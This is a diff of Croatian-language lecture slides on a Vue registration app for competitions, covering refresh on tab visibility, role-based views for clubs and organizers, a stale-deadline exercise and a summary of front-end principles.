+\begin{lstlisting}[language=typescript]
+// src/views/CompetitionView.vue
+function refreshWhenVisible() {
+  if (document.visibilityState === 'visible' && competition.value) load()
+}
+document.addEventListener('visibilitychange', refreshWhenVisible)
+onBeforeUnmount(() =>
+  document.removeEventListener('visibilitychange', refreshWhenVisible))
+\end{lstlisting}
+
+\vspace{0.3em}
+Povratkom na karticu natjecanje se dohvaća ponovno, a gumbi se usklađuju s razdobljem prije nego ih korisnik pritisne.
+
+\vspace{0.3em}
+Slušatelj se uklanja kad komponenta nestane. Inače bi ostao na dokumentu i dohvaćao natjecanje i nakon odlaska sa stranice.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Prikaz prema ulozi (I)}
+Klub i organizator otvaraju istu stranicu natjecanja i šalju isti zahtjev za prijave. Ono što s popisom rade toliko se razlikuje da jedna tablica ne odgovara obojici:
+
+\vspace{0.5em}
+\begin{center}
+{\small
+\setlength{\tabcolsep}{6pt}
+\renewcommand{\arraystretch}{1.25}
+\begin{tabular}{@{}L{3.4cm}L{3.6cm}L{3.6cm}@{}}
+  \toprule
+   & \textbf{Klub} & \textbf{Organizator} \\
+  \midrule
+  Prijava na natjecanju & nekoliko & stotine \\
+  Dohvat & jedan zahtjev & po stranicama \\
+  Obrazac nove prijave & da & ne \\
+  Pretraga i izvoz & ne & da \\
+  \bottomrule
+\end{tabular}
+}
+\end{center}
+
+\vspace{0.6em}
+Klub cijeli svoj popis dobiva jednim zahtjevom, a organizator popis koji raste dobiva po stranicama, uz pretragu i izvoz.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile]{Prikaz prema ulozi (II)}
+\begin{lstlisting}[language=html]
+<!-- src/views/CompetitionView.vue -->
+<template v-if="auth.isAdmin">
+  <h2>Prijave svih klubova</h2>
+  <AdminRegistrations :competition="competition" @stale="load" />
+</template>
+<ClubRegistrations v-else :competition="competition" @stale="load" />
+\end{lstlisting}
+
+\vspace{0.3em}
+Odjava i povratak isti su u obama prikazima, pa su izdvojeni u \codefile{src/composables/useStatusChange.ts}, koji oba prikaza pozivaju.
+
+\vspace{0.3em}
+Uloga bira prikaz. Podatke koje klub smije vidjeti i dalje bira poslužitelj: klub koji bi otvorio prikaz organizatora dobio bi od istog zahtjeva samo svoje prijave.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Vježba: razdoblje koje zastari}
+U običnom prozoru preglednika prijavljeni ste kao klub \texttt{behemot@plreg.hr}, a u privatnom kao organizator \texttt{admin@plreg.hr}.
+
+\vspace{0.5em}
 \begin{enumerate}
-  \itemsep0.4em
-  \item Kao klub otvorite popis prijava i provjerite koje su radnje ponuđene.
-  \item U drugom pregledniku se prijavite kao organizator i pomaknite preliminarni rok u prošlost.
-  \item U prvom pregledniku, bez osvježavanja, pokušajte prijaviti novog natjecatelja.
-  \item Osvježite stranicu i pogledajte iste gumbe.
-  \item Kao organizator pomaknite i konačni rok u prošlost, pa ponovite četvrti korak.
+  \itemsep0.3em
+  \item Kao klub dodajte natjecateljicu Petru Kos, rođenu 03.03.2003., ženskog spola, i otvorite \emph{Zimski kup}.
+  \item Kao organizator, u administraciji natjecanja, pomaknite preliminarni rok \emph{Zimskog kupa} na 01.11.2026. u 23:59.
+  \item U prozoru kluba, bez osvježavanja, prijavite Petru Kos u kategoriji \texttt{63}.
+  \item Kao organizator pomaknite konačni rok na 02.11.2026. u 23:59.
+  \item U prozoru kluba prijeđite na drugu karticu i vratite se.
+  \item Kao organizator vratite rokove na 14.02.2027. i 07.03.2027. u 23:59.
 \end{enumerate}
 
-\vspace{0.8em}
-Koji ste \texttt{code} dobili u trećem koraku i po čemu se prikaz u četvrtom i petom koraku razlikuje?
+\vspace{0.5em}
+Što se u prozoru kluba promijenilo nakon trećeg i nakon petog koraka i koji je događaj pokrenuo svaku od tih promjena?
 \end{frame}
 
 % ------------------------------------------------------------
 \begin{frame}{Sažetak}
 \begin{itemize}
-  \itemsep0.3em
-  \item Popisi stižu u dijelovima; \texttt{limit} je najviše sto, zadano dvadeset.
-  \item Odgovor ne nosi ukupan broj; kraj popisa poznaje se po kraćem odgovoru.
-  \item Filtar koji bira zapise pripada poslužitelju, onaj nad prikazanim pregledniku.
-  \item Filtar u pregledniku pretražuje samo stranicu koja je dohvaćena.
-  \item Razvrstavanje radi nad kopijom i uspoređuje po pravilima jezika.
-  \item Svaki korak od dohvata do prikaza ovisi o prethodnom.
-  \item Radnja koja se ne poništava traži potvrdu, s imenom zapisa.
-  \item Razdoblje dolazi iz odgovora, pa isti uvjet ne stoji na dvama mjestima.
-  \item Uloga odlučuje postoji li gumb, razdoblje odaziva li se.
-  \item Sučelje nije zaštita; odbijanje ostaje na poslužitelju.
+  \itemsep0.2em
+  \item Popis koji raste dohvaća se po stranicama.
+  \item Bez ukupnog broja zapisa zapis viška kaže postoji li sljedeća stranica.
+  \item Stranica i filtar stoje u adresi, a adresa je ulaz korisnika.
+  \item Filtar koji bira zapise pripada poslužitelju.
+  \item Pretraga u pregledniku obuhvaća samo prikazanu stranicu.
+  \item Imena se razvrstavaju po hrvatskoj abecedi i pretražuju bez dijakritika.
+  \item Potvrdu traži radnja koja se ne poništava, a dijalog drži fokus.
+  \item Izvoz dohvaća cijeli popis i ne izvodi formule iz podataka.
+  \item Radnje nad retkom izvode se iz razdoblja koje šalje poslužitelj.
+  \item Radnja koja više nije dopuštena ostaje vidljiva, onemogućena i s razlogom.
+  \item Zastarjelo razdoblje usklađuje se ponovnim dohvatom natjecanja.
 \end{itemize}
 \end{frame}
 
